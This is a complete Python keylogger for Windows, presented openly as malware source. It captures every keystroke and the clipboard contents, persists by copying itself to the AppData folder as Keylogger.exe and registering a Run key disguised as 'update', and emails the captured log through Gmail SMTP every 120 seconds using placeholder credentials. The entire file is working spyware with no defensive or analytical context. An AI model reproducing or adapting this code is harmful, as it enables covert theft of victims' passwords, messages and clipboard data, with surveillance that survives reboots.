#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib
import pyperclip
import os
import shutil
import subprocess
import sys

class Keylogger:

    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.become_persistant()

    def append_log(self, string):
        self.log = self.log + string

    def become_persistant(self):
        location = os.environ["appdata"] + "\\Keylogger.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell = True)

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)
        # print(current_key)

    def clipboard_copy(self):
        paste_list = []

        if pyperclip.paste() != 'None':
            paste_value = pyperclip.paste()

            if paste_value not in paste_list:
                paste_list.append(paste_value)

            # print(paste_list)
            self.append_log(str(paste_list))


    def report(self):
        # print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log )
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        self.clipboard_copy()
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.clipboard_copy()
            self.report()
            keyboard_listener.join()

listen = Keylogger(120, "email@gmail.com", "password")
listen.start()